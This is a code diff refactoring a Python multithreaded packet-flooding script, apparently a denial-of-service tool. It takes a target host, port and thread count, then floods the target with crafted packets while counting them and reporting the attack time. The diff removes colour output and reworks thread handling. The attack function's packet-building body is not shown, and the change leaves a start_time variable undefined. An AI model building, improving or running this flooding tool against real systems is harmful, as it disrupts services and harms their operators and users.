@@ -3,18 +3,6 @@ import sys
 import threading
 import time
 
-# ANSI color codes for colored output
-KRMZ = '\x1B[31m'
-YSL = '\x1B[32m'
-SR = '\x1B[33m'
-MV = '\x1B[34m'
-RESET = '\x1B[0m'
-
-# Global variable definitions.
-p_num = 0
-mut = threading.Lock()
-start_time = None
-
 def csum(data):
     n = len(data)
     sum_ = 0
@@ -32,7 +20,7 @@ def bilgi():
     global p_num, start_time
     time_diff = time.time() - start_time
     print("\n\n----------------------------------------------------------")
-    print(f"\n\nNumber of PACKETS: {YSL}{p_num}{RESET} \t Attack Time: {YSL}{time_diff:.2f}{RESET} second\n\n")
+    print(f"\n\nNumber of PACKETS: {p_num} \t Attack Time: {time_diff:.2f} second\n\n")
     print("----------------------------------------------------------\n\n")
     sys.exit(1)
 
@@ -89,15 +77,15 @@ def attack(target_ip, target_port):
             with mut:
                 p_num += 1
                 if p_num == 1:
-                    print(YSL"[+]"MV" Attack has been started!"RESET)
+                    print("[+] Attack has been started!")
 
         except:
             pass
 
 def main():
     if len(sys.argv) != 5:
-        print(SR"[!]"RESET" Please enter the commands correctly\n")
-        print(YSL"USAGE:"RESET"  python3 {} <source port> <target> <target port> <threads number>\n".format(sys.argv[0]))
+        print("[!] Please enter the commands correctly\n")
+        print("USAGE: python3 {} <source port> <target> <target port> <threads number>\n".format(sys.argv[0]))
         sys.exit(0)
 
     # Extract command-line arguments
@@ -113,19 +101,27 @@ def main():
     try:
         target_ip = socket.gethostbyname(target)
     except socket.gaierror as e:
-        print(KRMZ"[-]"RESET" DNS resolution failed for target: {}\n".format(target))
-        sys.exit(0)
+        print("[-] DNS resolution failed for target: {}\nError: {}".format(target, str(e)))
+        sys.exit(1)
 
-    # Create threads for the attack
+    global p_num, mut
+    p_num = 0
+    mut = threading.Lock()
+
+    # Start attack threads
     threads = []
     for _ in range(num_threads):
         t = threading.Thread(target=attack, args=(target_ip, target_port))
-        threads.append(t)
+        t.daemon = True
         t.start()
+        threads.append(t)
 
     # Wait for all threads to finish
-    for t in threads:
-        t.join()
+    try:
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        bilgi()
 
 if __name__ == "__main__":
     main()
